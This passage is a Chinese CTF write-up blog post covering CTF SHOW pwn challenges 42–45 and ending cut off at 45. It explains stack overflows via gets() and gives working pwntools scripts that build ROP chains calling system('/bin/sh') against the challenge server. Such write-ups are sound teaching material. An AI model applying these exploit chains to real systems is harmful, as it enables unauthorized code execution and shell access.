+<h2 id="pwn42（64位-sh替换-bin-sh（ROP））"><a href="#pwn42（64位-sh替换-bin-sh（ROP））" class="headerlink" title="pwn42（64位/sh替换/bin/sh（ROP））"></a>pwn42（64位/sh替换/bin/sh（ROP））</h2><p>和上道题的漏洞一样，不过是64位系统</p>
+<p> 偏移量：0xa</p>
+<p>system函数地址：0x400560</p>
+<p>sh字符串位置：0x400872</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317143350570.png" alt="image-20250317143350570" style="zoom:67%;"></p>
+<p>pop_rdi_ret地址：0x400843</p>
+<p>ret地址：0x40053e</p>
+<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">'linux'</span>, arch = <span class="string">'amd64'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"pwn.challenge.ctf.show"</span>,<span class="number">28269</span>)</span><br><span class="line">system_addr = <span class="number">0x400560</span></span><br><span class="line">sh_addr = <span class="number">0x400872</span></span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x400843</span></span><br><span class="line">ret_addr = <span class="number">0x40053e</span></span><br><span class="line">payload = <span class="string">b'a'</span> * <span class="number">0xa</span> + <span class="string">b'b'</span> * <span class="number">8</span> + p64(pop_rdi_ret_addr) + p64(sh_addr) + p64(ret_addr) +p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="pwn43（32位不提供后门函数参数）"><a href="#pwn43（32位不提供后门函数参数）" class="headerlink" title="pwn43（32位不提供后门函数参数）"></a>pwn43（32位不提供后门函数参数）</h2><p>32位系统</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317144157630.png" alt="image-20250317144157630" style="zoom:67%;"></p>
+<p>gets函数导致栈溢出</p>
+<p>查看后门函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317144316276.png" alt="image-20250317144316276" style="zoom:67%;"></p>
+<p>这次的后门函数似乎有点复杂</p>
+<p>首先v0作为种子，值为time(0)</p>
+<p>接着v3为v0作为种子的随机数</p>
+<p>然后需要输入一个数：v2</p>
+<p>如果v2和生成的随机数相同，则进入system函数</p>
+<p>破解随机数是下策</p>
+<p>我们找到一段可写区域</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317145903183.png" alt="image-20250317145903183" style="zoom:67%;"></p>
+<p>实际上这在bss段，其中还有一个buf2数组</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317145919246.png" alt="image-20250317145919246" style="zoom:67%;"></p>
+<p>我们可以在这里写入/bin/sh</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317192647582.png" alt="image-20250317192647582" style="zoom:67%;"></p>
+<h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">'linux'</span>, arch = <span class="string">'i386'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"pwn.challenge.ctf.show"</span>,<span class="number">28292</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x6c</span> + <span class="number">4</span></span><br><span class="line">sys_addr = <span class="number">0x08048450</span></span><br><span class="line">gets_addr = <span class="number">0x08048420</span></span><br><span class="line">bin_sh_addr = <span class="number">0x0804B060</span></span><br><span class="line"></span><br><span class="line">payload = offset * <span class="string">b'a'</span> + p32(gets_addr) + p32(sys_addr) + p32(bin_sh_addr) + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b'/bin/sh'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="pwn44（64位不提供后门函数参数）"><a href="#pwn44（64位不提供后门函数参数）" class="headerlink" title="pwn44（64位不提供后门函数参数）"></a>pwn44（64位不提供后门函数参数）</h2><p>漏洞原理和上道题一样，只不过换成了64位系统</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317193741187.png" alt="image-20250317193741187"></p>
+<p>找到一块可读写区域，位于bss段</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317193801701.png" alt="image-20250317193801701"></p>
+<p>将字符串的起始位置定位：0x602048</p>
+<p>system函数：0x400520</p>
+<p>gets函数：0x400530</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317194030271.png" alt="image-20250317194030271" style="zoom:50%;"></p>
+<p>pop_rdi_ret：0x4007f3</p>
+<p>ret：0x4004fe</p>
+<h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">'linux'</span>, arch = <span class="string">'amd64'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"pwn.challenge.ctf.show"</span>,<span class="number">28289</span>)</span><br><span class="line">bin_sh_addr = <span class="number">0x602048</span></span><br><span class="line">sys_addr = <span class="number">0x400520</span></span><br><span class="line">gets_addr = <span class="number">0x400530</span></span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x4007f3</span></span><br><span class="line">ret_addr = <span class="number">0x4004fe</span></span><br><span class="line">offset = <span class="number">0xa</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'a'</span> * offset + p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(ret_addr) + p64(gets_addr) + p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(ret_addr) +p64(sys_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b'/bin/sh'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<p><code>p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(ret_addr)</code>这一块在传递参数</p>
+<h2 id="Pwn45（32位无后门函数）"><a href="#Pwn45（32位无后门函数）" class="headerlink" title="Pwn45（32位无后门函数）"></a>Pwn45（32位无后门函数）</h2><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317200343722.png" alt="image-20250317200343722" style="zoom:50%;"></p>
+<p>103的长度读了200的数据，也是栈溢出</p>
+<p>不过这次没有后门函数了。怎么办呢？</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Pwn/" rel="tag"># Pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/12/09/c-%E4%BA%8B%E4%BB%B6/" rel="prev" title="c艹事件">
+      <i class="fa fa-chevron-left"></i> c艹事件
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/03/18/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" rel="next" title="文件包含漏洞">
+      文件包含漏洞 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      document.querySelectorAll('.post-shell .post-body p').forEach(paragraph => {
+        if (paragraph.textContent.trim().toLowerCase() === '[toc]') {
+          paragraph.remove();
+        }
+      });
+
+      const copyText = async text => {
+        if (navigator.clipboard && window.isSecureContext) {
+          await navigator.clipboard.writeText(text);
+          return true;
+        }
+        const textarea = document.createElement('textarea');
+        textarea.value = text;
+        textarea.setAttribute('readonly', '');
+        textarea.style.position = 'fixed';
+        textarea.style.top = '-9999px';
+        document.body.appendChild(textarea);
+        textarea.select();
+        const result = document.execCommand('copy');
+        textarea.remove();
+        return result;
+      };
+
+      document.querySelectorAll('.post-shell .post-body figure.highlight, .post-shell .post-body > pre:not(.mermaid)').forEach(block => {
+        if (block.querySelector('.post-code-copy')) return;
+        block.classList.add('post-code-copyable');
+        const button = document.createElement('button');
+        button.type = 'button';
+        button.className = 'post-code-copy';
+        button.textContent = 'Copy';
+        button.addEventListener('click', async () => {
+          const codeElement = block.matches('figure.highlight') ? block.querySelector('.code') : block;
+          const code = (codeElement ? codeElement.innerText : '').replace(/\n$/, '');
+          try {
+            await copyText(code);
+            button.textContent = 'Copied';
+            window.setTimeout(() => {
+              button.textContent = 'Copy';
+            }, 1200);
+          } catch (error) {
+            button.textContent = 'Failed';
+            window.setTimeout(() => {
+              button.textContent = 'Copy';
+            }, 1200);
+          }
+        });
+        block.appendChild(button);
+      });
+
+      const viewer = document.createElement('div');
+      viewer.className = 'post-image-viewer';
+      viewer.innerHTML = '<button type="button" class="post-image-viewer-close">Close</button><img alt="">';
+      document.body.appendChild(viewer);
+      const viewerImage = viewer.querySelector('img');
+      const viewerState = {
+        scale: 1,
+        x: 0,
+        y: 0,
+        minScale: 1,
+        maxScale: 6,
+        isDragging: false,
+        isPinching: false,
+        startX: 0,
+        startY: 0,
+        originX: 0,
+        originY: 0,
+        touchDistance: 0,
+        touchScale: 1,
+        touchCenterX: 0,
+        touchCenterY: 0
+      };
+      const clampViewerScale = scale => Math.min(viewerState.maxScale, Math.max(viewerState.minScale, scale));
+      const applyViewerTransform = () => {
+        viewerImage.style.setProperty('--viewer-scale', viewerState.scale);
+        viewerImage.style.setProperty('--viewer-x', `${viewerState.x}px`);
+        viewerImage.style.setProperty('--viewer-y', `${viewerState.y}px`);
+      };
+      const resetViewerState = () => {
+        viewerState.scale = 1;
+        viewerState.x = 0;
+        viewerState.y = 0;
+        viewerState.isDragging = false;
+        viewerState.isPinching = false;
+        viewerState.touchDistance = 0;
+        viewerState.touchScale = 1;
+        viewerState.touchCenterX = 0;
+        viewerState.touchCenterY = 0;
+        viewer.classList.remove('is-dragging');
+        applyViewerTransform();
+      };
+      const zoomViewerAt = (clientX, clientY, nextScale) => {
+        const oldScale = viewerState.scale;
+        const scale = clampViewerScale(nextScale);
+        if (scale === oldScale) return;
+
+        const rect = viewerImage.getBoundingClientRect();
+        const centerX = rect.left + rect.width / 2;
+        const centerY = rect.top + rect.height / 2;
+        const ratio = scale / oldScale;
+        viewerState.x -= (clientX - centerX) * (ratio - 1);
+        viewerState.y -= (clientY - centerY) * (ratio - 1);
+        viewerState.scale = scale;
+
+        if (viewerState.scale === 1) {
+          viewerState.x = 0;
+          viewerState.y = 0;
+        }
+        applyViewerTransform();
+      };
+      const closeViewer = () => {
+        viewer.classList.remove('is-active', 'is-dragging');
+        document.documentElement.classList.remove('post-image-viewer-open');
+        resetViewerState();
+      };
+      const openViewer = image => {
+        resetViewerState();
+        viewerImage.src = image.currentSrc || image.src;
+        viewerImage.alt = image.alt || '';
+        viewer.classList.add('is-active');
+        document.documentElement.classList.add('post-image-viewer-open');
+      };
+      const touchDistance = touches => Math.hypot(
+        touches[0].clientX - touches[1].clientX,
+        touches[0].clientY - touches[1].clientY
+      );
+      const touchCenter = touches => ({
+        x: (touches[0].clientX + touches[1].clientX) / 2,
+        y: (touches[0].clientY + touches[1].clientY) / 2
+      });
+
+      document.querySelectorAll('.post-shell .post-body img').forEach(image => {
+        image.tabIndex = 0;
+        image.addEventListener('click', event => {
+          event.preventDefault();
+          openViewer(image);
+        });
+        image.addEventListener('keydown', event => {
+          if (event.key === 'Enter') {
+            image.click();
+          }
+        });
+      });
+
+      viewer.addEventListener('wheel', event => {
+        if (!viewer.classList.contains('is-active')) return;
+        event.preventDefault();
+        const factor = event.deltaY < 0 ? 1.14 : 0.88;
+        zoomViewerAt(event.clientX, event.clientY, viewerState.scale * factor);
+      }, { passive: false });
+
+      viewerImage.addEventListener('dblclick', event => {
+        event.preventDefault();
+        resetViewerState();
+      });
+
+      viewerImage.addEventListener('pointerdown', event => {
+        if (!viewer.classList.contains('is-active') || event.button > 0 || viewerState.isPinching) return;
+        if (event.pointerType === 'touch' && event.isPrimary === false) return;
+        event.preventDefault();
+        viewerState.isDragging = true;
+        viewerState.startX = event.clientX;
+        viewerState.startY = event.clientY;
+        viewerState.originX = viewerState.x;
+        viewerState.originY = viewerState.y;
+        viewer.classList.add('is-dragging');
+        viewerImage.setPointerCapture(event.pointerId);
+      });
+
+      viewerImage.addEventListener('pointermove', event => {
+        if (!viewerState.isDragging || viewerState.isPinching) return;
+        viewerState.x = viewerState.originX + event.clientX - viewerState.startX;
+        viewerState.y = viewerState.originY + event.clientY - viewerState.startY;
+        applyViewerTransform();
+      });
+
+      const stopViewerDrag = event => {
+        if (!viewerState.isDragging) return;
+        viewerState.isDragging = false;
+        viewer.classList.remove('is-dragging');
+        if (event && viewerImage.hasPointerCapture(event.pointerId)) {
+          viewerImage.releasePointerCapture(event.pointerId);
+        }
+      };
+      viewerImage.addEventListener('pointerup', stopViewerDrag);
+      viewerImage.addEventListener('pointercancel', stopViewerDrag);
+
+      viewerImage.addEventListener('touchstart', event => {
+        if (event.touches.length !== 2) return;
+        event.preventDefault();
+        const center = touchCenter(event.touches);
+        viewerState.isPinching = true;
+        viewerState.isDragging = false;
+        viewerState.touchDistance = touchDistance(event.touches);
+        viewerState.touchScale = viewerState.scale;
+        viewerState.touchCenterX = center.x;
+        viewerState.touchCenterY = center.y;
+        viewer.classList.remove('is-dragging');
+      }, { passive: false });
+
+      viewerImage.addEventListener('touchmove', event => {
+        if (event.touches.length !== 2 || !viewerState.touchDistance) return;
+        event.preventDefault();
+        const center = touchCenter(event.touches);
+        viewerState.x += center.x - viewerState.touchCenterX;
+        viewerState.y += center.y - viewerState.touchCenterY;
+        viewerState.touchCenterX = center.x;
+        viewerState.touchCenterY = center.y;
+        applyViewerTransform();
+        const nextScale = viewerState.touchScale * (touchDistance(event.touches) / viewerState.touchDistance);
+        zoomViewerAt(center.x, center.y, nextScale);
+      }, { passive: false });
+
+      viewerImage.addEventListener('touchend', () => {
+        viewerState.isPinching = false;
+        viewerState.touchDistance = 0;
+        viewerState.touchScale = viewerState.scale;
+        viewerState.touchCenterX = 0;
+        viewerState.touchCenterY = 0;
+      });
+
+      viewerImage.addEventListener('touchcancel', () => {
+        viewerState.isPinching = false;
+        viewerState.touchDistance = 0;
+        viewerState.touchScale = viewerState.scale;
+        viewerState.touchCenterX = 0;
+        viewerState.touchCenterY = 0;
+      });
+
+      viewer.addEventListener('click', event => {
+        if (event.target === viewer || event.target.classList.contains('post-image-viewer-close')) {
+          closeViewer();
+        }
+      });
+      window.addEventListener('keyup', event => {
+        if (event.key === 'Escape') {
+          closeViewer();
+        }
+      });
+    });
+  </script>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF-SHOW"><span class="nav-number">1.</span> <span class="nav-text">CTF SHOW</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn35%EF%BC%88%E6%95%B0%E7%BB%84%E6%BA%A2%E5%87%BA%EF%BC%89"><span class="nav-number">1.1.</span> <span class="nav-text">pwn35（数组溢出）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn36%EF%BC%88%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0%E7%9B%B4%E6%8E%A5%E5%BE%97%E5%88%B0flag%EF%BC%89"><span class="nav-number">1.2.</span> <span class="nav-text">pwn36（后门函数直接得到flag）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.2.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn37%EF%BC%8832%E4%BD%8D%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0%E8%8E%B7%E5%BE%97shell%EF%BC%89"><span class="nav-number">1.3.</span> <span class="nav-text">pwn37（32位后门函数获得shell）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E3%80%90-%E3%80%91pwn38%EF%BC%8864%E4%BD%8D%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0%E8%8E%B7%E5%BE%97shell%EF%BC%89"><span class="nav-number">1.4.</span> <span class="nav-text">【*】pwn38（64位后门函数获得shell）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-2"><span class="nav-number">1.4.1.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp2-0"><span class="nav-number">1.4.2.</span> <span class="nav-text">exp2.0</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn39%EF%BC%8832%E4%BD%8D%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0system%E4%B8%8E%E5%8F%82%E6%95%B0%E5%88%86%E7%A6%BB%EF%BC%89"><span class="nav-number">1.5.</span> <span class="nav-text">pwn39（32位后门函数system与参数分离）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-3"><span class="nav-number">1.5.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn40%EF%BC%8864%E4%BD%8D%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0%E4%B8%8E%E5%8F%82%E6%95%B0%E5%88%86%E7%A6%BB%EF%BC%88ROP%EF%BC%89%EF%BC%89"><span class="nav-number">1.6.</span> <span class="nav-text">pwn40（64位后门函数与参数分离（ROP））</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-4"><span class="nav-number">1.6.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn41%EF%BC%8832%E4%BD%8Dsh%E6%9B%BF%E6%8D%A2-bin-sh%EF%BC%89"><span class="nav-number">1.7.</span> <span class="nav-text">pwn41（32位sh替换&#x2F;bin&#x2F;sh）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-5"><span class="nav-number">1.7.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn42%EF%BC%8864%E4%BD%8D-sh%E6%9B%BF%E6%8D%A2-bin-sh%EF%BC%88ROP%EF%BC%89%EF%BC%89"><span class="nav-number">1.8.</span> <span class="nav-text">pwn42（64位&#x2F;sh替换&#x2F;bin&#x2F;sh（ROP））</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-6"><span class="nav-number">1.8.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn43%EF%BC%8832%E4%BD%8D%E4%B8%8D%E6%8F%90%E4%BE%9B%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%EF%BC%89"><span class="nav-number">1.9.</span> <span class="nav-text">pwn43（32位不提供后门函数参数）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-7"><span class="nav-number">1.9.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn44%EF%BC%8864%E4%BD%8D%E4%B8%8D%E6%8F%90%E4%BE%9B%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%EF%BC%89"><span class="nav-number">1.10.</span> <span class="nav-text">pwn44（64位不提供后门函数参数）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-8"><span class="nav-number">1.10.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn45%EF%BC%8832%E4%BD%8D%E6%97%A0%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0%EF%BC%89"><span class="nav-number">1.11.</span> <span class="nav-text">Pwn45（32位无后门函数）</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Pocon</p>
+  <div class="site-description" itemprop="description">Pocon's personal blog about Computer Vision, CTF, Multimedia Forensics, Web Security, Pwn and Machine Learning.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Pocon</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+    
+  <script src="/lib/anime.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+    
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+<script>
+const mermaidBlocks = document.querySelectorAll('pre.mermaid');
+if (mermaidBlocks.length) {
+  mermaidBlocks.forEach(block => {
+    block.querySelectorAll('.post-code-copy').forEach(button => button.remove());
+  });
+
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@11.15.0/dist/mermaid.min.js', () => {
+    mermaid.initialize({
+      startOnLoad: false,
+      theme    : 'forest',
+      logLevel : 3,
+      flowchart: { curve     : 'linear' },
+      gantt    : { axisFormat: '%m/%d/%Y' },
+      sequence : { actorMargin: 50 }
+    });
+    if (mermaid.run) {
+      mermaid.run({ querySelector: 'pre.mermaid' });
+    } else {
+      mermaid.init(undefined, mermaidBlocks);
+    }
+  }, window.mermaid);
+}
+</script>
+
+
+  
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+</body>
+</html>
